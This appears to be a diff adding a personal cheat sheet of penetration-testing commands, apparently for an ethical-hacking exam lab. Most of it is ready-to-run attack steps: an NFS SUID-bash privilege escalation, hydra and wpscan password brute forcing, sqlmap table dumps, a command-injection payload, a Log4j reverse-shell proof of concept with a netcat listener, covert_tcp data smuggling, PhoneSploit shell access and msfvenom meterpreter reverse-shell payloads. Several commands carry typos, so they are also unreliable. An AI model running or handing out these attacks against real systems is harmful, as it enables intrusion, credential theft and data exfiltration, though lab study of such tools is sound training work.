@@ -1,0 +1,371 @@
+- BILLCIPHER
+
+`sudo su`
+`cd billcipher`
+`python3 billcipher.py`
+
+**perform http-recon to find NGIX version
+Header Option
+
+
+-----------------------------------------------------
+- NMAP
+	
+**Live Machines Count
+nmap -sP $IP/24
+
+------------------------------------------------------
+
+- LDAPSEARCH
+
+**Get the LDAP users and the DC values
+`sudo su`
+`ldapsearch -h $TIP -x -s base namingcontexts`
+`ldapsearch -x -h $TIP -b "DC=HACKORG,DC=com" "objectClass=person" | grep Users`
+
+**LDAP Version
+`ldapsearch -x -h $TIP -b "DC=CEHORG,DC=com" "objectClass=person"
+
+-------------------------------------------------------
+
+- ZENMAP
+
+** Check SMB enumeration whether message signing is enabled
+** Host that host the MySQL
+
+--------------------------------------------------------
+
+- JOHN
+
+** Crack NTLM
+John hashes.txt
+john hashes.txt --foramt=NT 
+john hashes.txt --foramt=NT --show
+
+----------------------------------------------------------------
+
+- LOPCRACK
+
+** Find passwords
+
+------------------------------------------------------------------
+
+- NFS EXPLOIT
+
+** Escalate Privileges
+- 1.`sudo apt-get install nfs-common`
+- 2. `showmount -e $TIP`
+- 3. `mkdir /tmp/nfs`
+- 4. `sudo mount -t nfs $TIP:/home /tmp/nfs`
+- 5. `cp /bin/bash /tmp/nfs`
+- 6. `chmod +s bash`
+- 7. `ssh ubuntu@$TIP`
+- 8. `./bash -p`
+- 9. `whoami`
+- 10. `locate flag.txt`
+
+----------------------------------------------------------------------
+
+- SNOW
+
+** find hidden in txt
+- 1. Copy Snow folder to Desktop
+- 2. On cmd go to Snow folder on desktop
+- 3. `snow -C file.txt`
+
+--------------------------------------------------------------------------
+
+- OPENSTEGO
+
+** find hidden in image
+1. Install it using the share
+- 2. open the app and choose the file and create folder for the extracted data
+
+-------------------------------------------------------------------
+
+- WIRESHARK
+
+**Covert_TCP
+used the filter `tcp && ip.addr == $TIP
+Went to packets source 10.10.1.10
+Expand the Internet protocol and click on *identification*
+
+**Passwords
+On Wireshark *http.request.method == post*
+Expand the HTML form URL
+
+**DoS
+On wireshark sort press on *statictics* --> IPV4 --> source and destination address
+
+**IoT
+search for mqtt
+see the message in Topic section
+expand the MQTT
+look at *Topic*
+
+--------------------------------------------------------------------------------
+
+- BinText
+
+** Analyze malware
+
+---------------------------------------------------------------------------------
+
+- YERSINA
+
+**DHCP Attack
+`Sudo su`
+`cd`
+`yersina -I`
+Press any key
+press *F2* for DHCP
+press *x* to list attacks
+press *1*
+On wireshark expand Dynamic Host
+press *q* to stop the attack
+
+---------------------------------------------------------------------------------
+
+- HYDRA
+
+**FTP
+hydra -L usernames.txt -P rockyou.txt $TIP ftp
+
+-----------------------------------------------------------------------------------
+
+- LDP
+
+**Detect load balancer
+ldp website.com
+
+---------------------------------------------------------------------------------
+
+- TELENT OR NC
+
+**Banner Grapping
+**Find HTTP Server
+telnet website.com 80
+nc -vv website.com 80
+
+---------------------------------------------------------------------------------
+
+- WIG
+
+**CMS 
+wig website.com
+
+------------------------------------------------------------------------------------
+
+- GhostEye
+
+**Click Jacking Vulnerabilities
+`cd ghost_eye`
+`pip3 install -r requirments.txt`
+`pyhton3 ghosteye.py`
+
+-------------------------------------------------------------------------------------
+
+- GoBuster & WPSCAN
+
+**find login page and bruteforce it
+`gobuster dir -u http://www.website.com/ -w /worlist/directoy.txt -x php`
+`wpscan --url http://www.cehorg.com/wp-login.php -U Adam -P /password.txt`
+
+------------------------------------------------------------------------------------
+
+- SQLMAP
+
+`sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="ndaiocxasm" --dbs`
+`sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="ndaiocxasm" -D DBname --tables`
+`sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="ndaiocxasm" -D DBname -T tablename --dump`
+
+------------------------------------------------------------------------------------
+
+- PWNXSS
+
+**Find XSS vulnerabilitied
+`python3 pwnxss.py -u http://www.yahoo.com`
+
+-------------------------------------------------------------------------------------
+
+- COMMAND INJECTION
+
+On website go to IP:8080/DVWA
+Change secuirty to Low
+$IP && net user
+
+-------------------------------------------------------------------------------------
+
+- HASHES
+
+`hashid -m "adnlsaaaa"`
+Used Decrypt hash website (Hashes.com/en/decrypt/hash)
+
+-------------------------------------------------------------------------------------
+
+- LOG4J
+
+cd log4j-shell-poc
+cd /home/attacker
+tar -xf jdk-8u202-linux-x64.tar.gz
+mv jdk1.8.0_202 /usr/bin/
+cd log4j-shell-poc
+pluma poc.py
+In the poc.py file scroll down and in line 62, replace **jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac
+Scroll down to line **87** and replace **jdk1.8.0_20/bin/java** with **/usr/bin/jdk1.8.0_202/bin/java
+Scroll down to line **99** and replace **jdk1.8.0_20/bin/java** with **/usr/bin/jdk1.8.0_202/bin/java
+save
+nc -lvp 9001
+python3 poc.py --userip $Attacker_IP --webport 8000 --lport 9001
+Now, copy the payload generated in the **send me**: section.
+witch to **Firefox** browser window, in **Username** field paste the payload that was copied in previous step and in **Password** field type **password** and press **Login** button as shown in the screenshot.
+
+> Note: In the **Password** field you can enter any password.
+
+
+-------------------------------------------------------------------------------------
+
+
+- PhoneSploit
+
+python3 Phonesploit.py
+3 to connect to phone
+enter phone IP
+4 to access shell on Phone
+cd SDcard/
+
+-------------------------------------------------------------------------------------
+
+- APK ANALYZER
+
+use website SISK APK ANALYZR
+
+-------------------------------------------------------------------------------------
+
+- HASHCalc
+
+**File Integrity
+
+
+-------------------------------------------------------------------------------------
+
+- BCTextEncoder
+
+**Decode txt file
+
+-------------------------------------------------------------------------------------
+
+- AES
+
+**Decode file.docs.txt
+Use advanced Encrypt tool which is AES on windows and unselect the option "enter key as hex"
+
+-------------------------------------------------------------------------------------
+
+- VERACRYPT
+
+**Decrypt Volume
+Use veracrypt and select the file then open the volume decrypted**
+
+-------------------------------------------------------------------------------------
+
+- CrypTool
+
+**Cryptanylsis
+Use Crypt Tool on windows**
+Based on the naming its 128 bit
+Open the file using Crypt Tool
+Click on *Encrypt/Decrypt*
+Try diffrent encryption types until you see the 128 bit
+fill the hex code it should be exist in the file name
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+- Hydra
+
+**for Invalid User
+`hydra -L usernames.txt -p test 10.10.195.126 http-post-form "/wp-login:log=^USER^&pwd=^PWD^:Invalid username" -t 30`
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+- Covert-Tcp
+	1. Copy *Covert_Tcp.c* file to Desktop
+	2. On Terminal `cc -o covert_tcp covert_tcp.c` this compiles the covert_tcp.c file
+	3. On victum start the listener `tcpdump -nvvx port 8888 -i lo`, and create new folder with Receive.txt inside it
+	4. Copy covert.tcp.c file to foler created  and open new terminal tap
+	5. ``cc -o covert_tcp covert_tcp.c``
+	6. start listener by `./covert_tcp -dest VictumIP -source AttackerIP -source_port 9999 -det_port 8888 -server -file /home/Desktop/Recieve/recieve.txt`
+	7. Now back to Attacker, ``./covert_tcp -dest VictumIP -source AttackerIP -source_port 9999 -det_port 8888 -server -file /home/Desktop/send/secret.txt``
+	8. This will send the message letter by letter (Packet by packet)
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+- SMB
+list shares
+	```
+	smbclient -L 10.10.80.101 -U ahmad
+	```
+	connect using SMB to a found share for example "Backup" share
+	```
+	smbclient \\\\10.10.80.101\\backup -U ahamd
+	```
+	pass files to kali
+	```
+	get filename
+	```
+	move file from Attacker to Host
+	` put filename.exe
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+- GTFONOW
+python3 grfonow.py -a
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+- MSFVENOM
+
+## Linux
+``` 
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.9.135.60 LPORT=XXXX -f elf > rev_shell.elf
+```
+## Windows 
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+
+**Run Handler on Attacker
+
+use exploit/multi/handler
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+View Options
+
+## the LHOST and LPORT should be the attacker IP and same msfvenop port
+
+exploit
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
